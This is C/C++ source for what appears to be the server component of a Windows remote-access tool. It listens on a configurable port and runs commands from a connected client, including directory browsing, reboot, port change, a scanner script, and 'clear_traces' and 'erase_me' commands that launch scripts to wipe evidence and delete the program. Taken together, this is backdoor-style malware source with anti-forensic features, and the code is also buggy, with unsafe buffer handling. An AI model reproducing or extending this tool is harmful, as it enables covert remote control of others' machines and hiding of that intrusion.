#include <WS2tcpip.h>
#include <WinSock2.h>
#include <stdio.h>
#include <direct.h>
#include <string.h>
#include <dirent.h>

#pragma comment(lib, "Ws2_32.lib")

// Command descriptors
#define _exit 1
#define _cd 2
#define _reboot 3
#define _pwd 4
#define _gohome 5
#define _chport 6
#define _sound 7
#define _send_file 8
#define _ls 9
#define _help 10
#define _scanner 11
#define _clear_traces 12
#define _erase_me 13

// Functions
short int giveInfo(char * str);
void addChar(char * str, char ch);
int checkCommand(char * ServBuf);
void startLocalCommand(int desc, char * ServBuf, SOCKET clSock);
char * concat(const char * first, const char * second, const char);
char * giveParametres(char * ServBuf);
char * FirstWord(char * ServBuf);

// Global variables
char currentPath[512];
char mainPath[512];

// Main function
int main(){

	int allCountBytes = 0;
	int bytesReceived;
	char WinBuf[10];

	WSADATA wsdata;
	WORD ver = MAKEWORD(2, 2);

	int wsok = WSAStartup(ver, &wsdata);

	if (wsok != 0){
		perror("Can't initialize winsock\n");
		return 1;
	}

	SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
	if (listening == INVALID_SOCKET){
		perror("Can't create a socket\n");
		return 1;
	}

	char bufStr[256];
	char date[12], time[6];
	char *tempb, *r, *q;
	FILE * file_log, * temp_file;
	FILE* file = fopen("..\\settings\\config.cfg", "r");
	if (!file){
		perror("Can't open configuration file");
		return 1;
	}
	fgets(bufStr, 256, file);
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(giveInfo(bufStr)); // Give of file config
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	bind(listening, (sockaddr*)&hint, sizeof(hint));

	listen(listening, SOMAXCONN);

	sockaddr_in client;
	int sizeclient = sizeof(client);

	SOCKET clientSock = accept(listening, (sockaddr*)&client, &sizeclient);

	if (clientSock == INVALID_SOCKET){
		fclose(file);
		perror("Bad client!\n");
		return 1;
	}

	char host[NI_MAXHOST];
	char service[NI_MAXSERV];
	ZeroMemory(host, NI_MAXHOST);
	ZeroMemory(service, NI_MAXSERV);

	// End listen 
	closesocket(listening);

	fgets(bufStr, 256, file);
	short int MAXSIZEOFREQUESTCLIENT = giveInfo(bufStr); // Give of file config
	char buf[MAXSIZEOFREQUESTCLIENT];

	fclose(file);

	// Write in log file
	file_log = fopen("log/startapp.log", "a");
	system("date /t > temp_log");
	temp_file = fopen("temp_log", "r");
	fgets(date, 12, temp_file);
	fclose(temp_file);
	system("time /t > temp_log");
	temp_file = fopen("temp_log", "r");
	fgets(time, 6, temp_file);
	r = tempb = concat("", date, '[');
	q = concat("", time, '[');
	tempb = concat(tempb, q, ']');
	delete [] r;
	delete [] q;
	r = tempb;
	tempb = concat(tempb, " Launched. ( serv.exe )", ']');
	delete [] r;
	fputs(tempb, file_log);
	fputc('\n', file_log);
	delete [] tempb;
	fclose(temp_file);
	fclose(file_log);
	system("del temp_log");

	getcwd(::currentPath, 512);
	strcpy(::mainPath, ::currentPath);
	send(clientSock, "Current path: ", strlen("Current path: "), 0);
	send(clientSock, ::currentPath, strlen(::currentPath), 0);

	send(clientSock, "\r", 1, 0);

	while (true){
		ZeroMemory(buf, MAXSIZEOFREQUESTCLIENT);

		// For Windows
		ZeroMemory(WinBuf, 10);
		send(clientSock, "\r\n>> ", 5, 0);
		while (bytesReceived = recv(clientSock, WinBuf, 10, 0), allCountBytes++, WinBuf[1] != '\n')
			addChar(buf, WinBuf[0]);
		
		if(bytesReceived == SOCKET_ERROR){
			perror("Error in recv()\n");
			return 1;
		}

		if (bytesReceived == 0){
			puts("Client disconnected");
			break;
		}

		// Made answer
		if (!checkCommand(buf)) send(clientSock, buf, allCountBytes + 1, 0);
		else startLocalCommand(checkCommand(buf), buf, clientSock);
	}

	// Close socket
	closesocket(clientSock);

	WSACleanup();
}

// Function reliasation
short int giveInfo(char * str){
	while (*str++ != '=');
	return atoi(str);
}

void addChar(char * str, char ch){
	str[strlen(str)] = ch;
	str[strlen(str) + 1] = '\0';
}

int checkCommand(char * ServBuf){
	unsigned char countCommands = 13;
	char arrCommand[countCommands][128] = {
		"exit", "cd", "reboot", "pwd", "gohome", "chport",
		"sound", "send_file", "ls", "help", "scanner",
		"clear_traces", "erase_me"
	};

	bool f = true;
	char * fword = FirstWord(ServBuf);
	if (fword == nullptr) {fword = ServBuf; f = false;}
	for (int i = 0; i < countCommands; i++)
		if (!strcmp(fword, arrCommand[i])){
			if (f) delete [] fword;
			return ++i;
		}
	if (f) delete [] fword;
	return 0;
}

char * giveParametres(char * ServBuf){
	while (*ServBuf++ != ' ');
	char * parametres = new char[strlen(ServBuf) + 1], * pos = parametres;
	while (*parametres++ = *ServBuf++);
	return pos;
}

char * FirstWord(char * ServBuf){
	bool fl = false;
	char ind;
	for (int i = 0;i < strlen(ServBuf);i++)
		if (ServBuf[i] == ' ') {fl = true; ind = i;}
	if (!fl) return nullptr;

	char * res = new char[ind + 1];
	for (int i = 0; i < ind; i++)
		res[i] = ServBuf[i];
	res[ind] = '\0';
	return res;
}

char * concat(const char * first, const char * second, const char separator='\\'){
	char * res = new char[strlen(first) + strlen(second) + 2];
	for (int i = 0; i < strlen(first);i++)
		res[i] = first[i];
	res[strlen(first)] = separator;
	for (int i = strlen(first) + 1, j = 0; i < strlen(first) + strlen(second) + 1; i++, j++)
		res[i] = second[j];
	res[strlen(first) + strlen(second) + 1] = '\0';
	return res;
}

void startLocalCommand(int desc, char * ServBuf, SOCKET clSock){
	char * temp, * r, * q;
	switch (desc)
	{
	case _exit:{
		r = temp = concat("start /MIN /D ", ::mainPath, '"');
		temp = concat(temp, " exit.exe", '"');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}
	
	case _cd:{
		char * path = giveParametres(ServBuf);
		chdir(path);
		getcwd(::currentPath, 512);
		delete [] path;
		break;
	}

	case _reboot:{
		r = temp = concat("start /D ", ::mainPath, '"');
		temp = concat(temp, " reboot.vbs", '"');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}

	case _pwd:{
		getcwd(::currentPath, 512);
		send(clSock, ::currentPath, strlen(::currentPath), 0);
		break;
	}

	case _gohome:{
		chdir(::mainPath);
		getcwd(::currentPath, 512);
		break;
	}

	case _chport:{
		r = temp = concat("start /MIN /D ", ::mainPath, '"');
		q = giveParametres(ServBuf);
		temp = concat(temp, " chport.exe", '"');
		delete [] r;
		r = temp;
		temp = concat(temp, q, ' ');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}

	case _sound:{
		r = temp = concat("start /MIN /D ", ::mainPath, '"');
		q = giveParametres(ServBuf);
		temp = concat(temp, " sound.exe", '"');
		delete [] r;
		r = temp;
		temp = concat(temp, q, ' ');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}

	case _send_file:{ // not end
		FILE * file = fopen("file.txt", "w");
		fputs(ServBuf, file);
		fclose(file);
		break;
	}

	case _ls:{
		DIR * dir;
		struct dirent *ent;
		if ((dir = opendir(::currentPath)) != NULL){
			while ((ent = readdir(dir)) != NULL){
				send(clSock, ent->d_name, strlen(ent->d_name), 0);
				#ifndef __linux__
					send(clSock, "\r\n", 2, 0);
				#else
					send(clSock, "\n", 1, 0);
				#endif
			}
			closedir(dir);
		}
		else send(clSock, "Error", 5, 0);
		break;
	}

	case _help:{
		send(clSock, "exit, cd, reboot, pwd, gohome, chport, sound, send_file, ls, help, scanner, clear_traces, erase_me\0", 
			strlen("exit, cd, reboot, pwd, gohome, chport, sound, send_file, ls, help, scanner, clear_traces, erase_me\0"), 0);
		break;
	}

	case _scanner:{
		r = temp = concat("start /D ", ::mainPath, '"');
		temp = concat(temp, " scanner.vbs", '"');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}

	case _clear_traces:{
		r = temp = concat("start /D ", ::mainPath, '"');
		temp = concat(temp, "clean");
		delete [] r;
		r = temp;
		temp = concat(temp, " clear_traces.vbs", '"');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}

	case _erase_me:{
		r = temp = concat("start /D ", ::mainPath, '"');
		temp = concat(temp, "kill");
		delete [] r;
		r = temp;
		temp = concat(temp, " kill.vbs", '"');
		delete [] r;
		system(temp);
		delete [] temp;
		break;
	}
	}
}
